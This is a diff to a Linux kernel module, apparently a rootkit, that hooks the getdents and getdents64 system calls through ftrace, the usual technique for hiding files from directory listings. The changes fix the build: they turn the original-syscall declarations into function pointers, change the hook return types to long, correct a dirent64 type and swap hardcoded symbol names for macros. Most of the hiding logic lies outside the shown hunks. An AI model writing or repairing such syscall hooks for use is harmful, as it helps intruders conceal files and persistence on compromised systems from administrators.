@@ -1,4 +1,5 @@
 #include <linux/slab.h>
+#include <linux/uaccess.h>
 
 #include "config.h"
 #include "hook.h"
@@ -9,8 +10,8 @@
 static asmlinkage long (*_sys_getdents)(const struct pt_regs *regs);
 static asmlinkage long (*_sys_getdents64)(const struct pt_regs *regs);
 #else
-static asmlinkage long _sys_getdents(unsigned int fd, struct linux_dirent __user * dirent, unsigned int count);
-static asmlinkage long _sys_getdents64(unsigned int fd, struct linux_dirent64 __user * dirent, unsigned int count);
+static asmlinkage long (*_sys_getdents)(unsigned int fd, struct linux_dirent __user * dirent, unsigned int count);
+static asmlinkage long (*_sys_getdents64)(unsigned int fd, struct linux_dirent64 __user * dirent, unsigned int count);
 #endif
 
 #ifdef HTM_PTREGS_SYSCALL_STUBS
@@ -21,9 +22,9 @@ static notrace asmlinkage long _sys_getdents_hook(const struct pt_regs *regs)
 
 	int ret = _sys_getdents(regs);
 #else
-static notrace asmlinkage int _sys_getdents_hook(unsigned int fd,
-                                                 struct linux_dirent __user * dirent,
-                                                 unsigned int count)
+static notrace asmlinkage long _sys_getdents_hook(unsigned int fd,
+                                                  struct linux_dirent __user * dirent,
+                                                  unsigned int count)
 {
 	struct linux_dirent *prv, *cur, *tmp = NULL;
 	int ret = _sys_getdents(fd, dirent, count);
@@ -82,9 +83,9 @@ static notrace asmlinkage long _sys_getdents64_hook(const struct pt_regs *regs)
 
 	int ret = _sys_getdents64(regs);
 #else
-static notrace asmlinkage int _sys_getdents64_hook(unsigned int fd,
-                                                   struct linux_dirent __user * dirent,
-                                                   unsigned int count)
+static notrace asmlinkage long _sys_getdents64_hook(unsigned int fd,
+                                                    struct linux_dirent64 __user * dirent,
+                                                    unsigned int count)
 {
 	struct linux_dirent64 *prv, *cur, *tmp = NULL;
 	int ret = _sys_getdents64(fd, dirent, count);
@@ -135,5 +136,5 @@ _sys_getdents64_hook_ret:
 	return ret;
 }
 
-struct htm_ftrace_hook hook_sys_getdents = HTM_HOOK("__x64_sys_getdents", _sys_getdents_hook, &_sys_getdents);
-struct htm_ftrace_hook hook_sys_getdents64 = HTM_HOOK("__x64_sys_getdents64", _sys_getdents64_hook, &_sys_getdents64);
+struct htm_ftrace_hook hook_sys_getdents = HTM_HOOK(HTM_SYM_GETDENTS, _sys_getdents_hook, &_sys_getdents);
+struct htm_ftrace_hook hook_sys_getdents64 = HTM_HOOK(HTM_SYM_GETDENTS64, _sys_getdents64_hook, &_sys_getdents64);
